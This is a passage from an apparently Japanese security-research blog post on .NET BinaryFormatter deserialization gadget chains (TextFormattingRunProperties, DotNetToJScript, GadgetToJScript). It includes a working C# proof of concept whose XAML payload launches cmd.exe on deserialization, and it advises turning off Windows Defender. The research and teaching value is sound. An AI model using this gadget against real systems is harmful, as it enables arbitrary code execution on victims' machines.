&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;(..&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;snip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;BinaryFormatter&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BinaryFormatter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mscorlib_only&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BuildLoaderDelegateMscorlib&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;assembly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BuildLoaderDelegate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;assembly&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;見ての通り、このコードは ObjectSurrogate で任意にシリアライズされる前提で、何の考慮もせずにシリアライズしています。&lt;/p&gt;
&lt;p&gt;D2JS はリリース当時、クロスプラットフォームで .NET プログラムを読み込める便利ツールとして非常に使われていましたが、先述の通り .NET 4.8 での ObjectSurrogate.GetObjectData の変更によって、最新の Windows 10, Windows Server では動作しなくなりました。&lt;/p&gt;
&lt;h3 id=&#34;ysoserialnet-とガジェットチェーン&#34;&gt;ysoserial.net とガジェットチェーン&lt;/h3&gt;
&lt;p&gt;話は変わってガジェットチェーンの話。D2JS とは別の成果として、Java の ysoserial に触発された &lt;a href=&#34;https://github.com/pwntester/ysoserial.net&#34;&gt;ysoserial.net&lt;/a&gt; プロジェクトにおいて、.NET プログラムを複数のクラスを経由して読み込むガジェットチェーンがいくつか発見されていました。&lt;/p&gt;
&lt;p&gt;中でも使いやすいガジェットチェーンとして &lt;a href=&#34;https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282&#34;&gt;MicroFocus のブログ&lt;/a&gt; で提案された、&lt;code&gt;TextFormattingRunProperties&lt;/code&gt; ガジェットがあげられます。このガジェットの利点はガジェットペイロードのフットプリントが小さいことです。&lt;/p&gt;
&lt;h4 id=&#34;textformattingrunproperties-で-cmdexe-の実行&#34;&gt;TextFormattingRunProperties で cmd.exe の実行&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.text.formatting.textformattingrunproperties?view=visualstudiosdk-2019&#34;&gt;TextFormattingRunProperties&lt;/a&gt; はテキストフォーマットの書式設定に関する情報を保持するクラスです。このクラスは Serializable アトリビュートを付与されているため&lt;code&gt;DisableActivitySurrogateSelectorTypeCheck &lt;/code&gt;には引っかからずにデシリアライズが可能です。また本クラスの ForegroundBrush プロパティは xaml 形式で定義が可能なので、任意のオブジェクトをソースコードに記載できコンパクトな形で実装できます。&lt;/p&gt;
&lt;p&gt;以下は  TextFormattingRunProperties を利用して xaml で定義されたオブジェクトをデシリアライズさせ、電卓を実行するコードです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.IO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Runtime.Serialization&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Runtime.Serialization.Formatters.Binary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Configuration&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/**
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;    Ref:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;    https://community.microfocus.com/t5/Security-Research-Blog/New-NET-deserialization-gadget-for-compact-payload-When-size/ba-p/1763282
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;**/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;na&#34;&gt;[Serializable]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;TextFormattingRunPropertiesMarshal&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ISerializable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xaml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GetObjectData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SerializationInfo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;StreamingContext&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Type&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GetType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties, Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SetType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AddValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ForegroundBrush&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xaml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TextFormattingRunPropertiesMarshal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xaml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;m&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xaml&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xaml&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Program&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;xaml_payload&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;@&amp;#34;&amp;lt;ResourceDictionary
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        xmlns=&amp;#34;&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        xmlns:x = &amp;#34;&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        xmlns:System = &amp;#34;&amp;#34;clr-namespace:System;assembly=mscorlib&amp;#34;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        xmlns:Diag = &amp;#34;&amp;#34;clr-namespace:System.Diagnostics;assembly=system&amp;#34;&amp;#34;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        &amp;lt;ObjectDataProvider x:Key = &amp;#34;&amp;#34;Calc&amp;#34;&amp;#34; ObjectType = &amp;#34;&amp;#34;{x:Type Diag:Process}&amp;#34;&amp;#34; MethodName = &amp;#34;&amp;#34;Start&amp;#34;&amp;#34;&amp;gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;            &amp;lt;ObjectDataProvider.MethodParameters&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;                &amp;lt;System:String&amp;gt;cmd&amp;lt;/System:String&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;                &amp;lt;System:String&amp;gt;/c calc&amp;lt;/System:String&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;            &amp;lt;/ObjectDataProvider.MethodParameters&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        &amp;lt;/ObjectDataProvider&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;        &amp;lt;/ResourceDictionary&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;TextFormattingRunPropertiesMarshal&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;TextFormattingRunPropertiesMarshal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xaml_payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;BinaryFormatter&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BinaryFormatter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MemoryStream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Position&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Deserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;このコードでは ForegroundBrush プロパティに xaml オブジェクトを代入させシリアライズを行っています。&lt;/p&gt;
&lt;p&gt;これをコンパイルして実行したとき、&lt;code&gt;Process.Start(&amp;quot;cmd.exe /c calc.exe&amp;quot;)&lt;/code&gt; が定義された xaml テキストがデシリアライズされ、電卓が起動しました。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/deserialize2_ok.png&#34; alt=&#34;deserialize2_ok&#34;&gt;
&lt;/p&gt;
&lt;p&gt;なお実行時は例外が発生します。&lt;/p&gt;
&lt;h4 id=&#34;なぜ-foregroundbrush-&#34;&gt;なぜ ForegroundBrush ？&lt;/h4&gt;
&lt;p&gt;TextFormattingRunProperties を使ったデシリアライズは、なぜ ForegroundBrush を利用するのでしょうか？他のプロパティではダメなのでしょうか？この疑問を解決する記述がどこにも見当たらなかったため、私は TextFormattingRunProperties の実装を確認することにしました。&lt;/p&gt;
&lt;p&gt;WinDbg でコンパイルした実行ファイルをデバッグすると、TextFormattingRunProperties は &lt;code&gt;Microsoft.PowerShell.Editor.dll&lt;/code&gt; で実装されていることがわかります。次に dll のファイルパスを調べたところ、私の環境では以下に位置していました。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.PowerShell.Editor\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Editor.dll&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;これを dnSpy でデコンパイルし、該当箇所を探します。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/dec_TextFormattingRunProperties.png&#34; alt=&#34;dec_TextFormattingRunProperties&#34;&gt;
&lt;/p&gt;
&lt;p&gt;コンストラクタを見れば一目瞭然でした。コンストラクタのプロパティの初期化が ForegroundBrush から始まっています。コンストラクタ実行時に真っ先に ForegroundBrush のデシリアライズが行われますが、そこで xaml で仕込んだ &lt;code&gt;Process.Start&lt;/code&gt; が実行されます。当然 Brush クラスの正しいオブジェクトではないので例外が発生しますが、例外発生前に Process.Start は実行されているので問題ありません。&lt;/p&gt;
&lt;p&gt;なお xaml で正しい ForegroundBrush プロパティを実装すれば次に初期化される BackgroundBrush で任意のオブジェクト定義を行うことも可能ですが、コンパクトに任意オブジェクトをシリアライズしたいならやはり ForegroundBrush で仕込む必要があるということです。&lt;/p&gt;
&lt;p&gt;また正しくないデシリアライズによって例外が発生しコンストラクタが中断されるため、複数プロパティについて AddValue() で xaml を定義し同時に複数オブジェクトをデシリアライズするのは難しいこともわかります。&lt;/p&gt;
&lt;h2 id=&#34;gadgettojscript-の登場&#34;&gt;GadgetToJScript の登場&lt;/h2&gt;
&lt;p&gt;D2JS が .NET 4.8 の変更で使えなくなったあと、 D2J の作者である Nick 氏 によって、TextFormattingRunProperties ガジェットを利用し &lt;code&gt;DisableActivitySurrogateSelectorTypeCheck&lt;/code&gt; を true にするという XAML 形式のオブジェクトが&lt;a href=&#34;https://silentbreaksecurity.com/re-animating-activitysurrogateselector/&#34;&gt;作成され&lt;/a&gt;、 ysoserial.net にマージされました。このマージされたコードをもとに作成したのが、改良版 D2JS ともいえる &lt;a href=&#34;https://github.com/med0x2e/GadgetToJScript&#34;&gt;&lt;strong&gt;GadgetToJScript&lt;/strong&gt;&lt;/a&gt; です。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;任意のオブジェクトをデシリアライズするために .NET のガジェットチェーンを使っているから Gadget が名称についているのでしょう。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;g2js-の実装&#34;&gt;G2JS の実装&lt;/h3&gt;
&lt;p&gt;G2JS で生成されたスクリプトの最初の動作として、.NET 4.8 以降の環境で実行させるときは初めに TextFormattingRunProperties ガジェットを経由して .NET 4.8 で変更されたデシリアライズ時の型チェックを無効にします (stage1)。そして次にユーザが指定した .NET プログラムをデシリアライズします (stage2)。&lt;/p&gt;
&lt;p&gt;つまりデシリアライズを2回行うようになりました。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;images/g2js_scructure.png&#34; alt=&#34;g2js_scructure&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ただ D2JS も G2JS も、.NET プログラムを読み込む起点はどちらも BinaryFormatter を利用しているため、これらのツールによって生成されるスクリプトに大きな違いはありません。&lt;/p&gt;
&lt;h2 id=&#34;ウォークスルー&#34;&gt;ウォークスルー&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;G2JS で生成されたスクリプトはそのままだと Windows Defender のリアルタイムスキャンで検知されるので、検証される方はあらかじめオフにしてください。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;テストコードとして、メッセージボックスを表示するだけの C# プログラムを作成します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;System.Windows.Forms&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Program&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
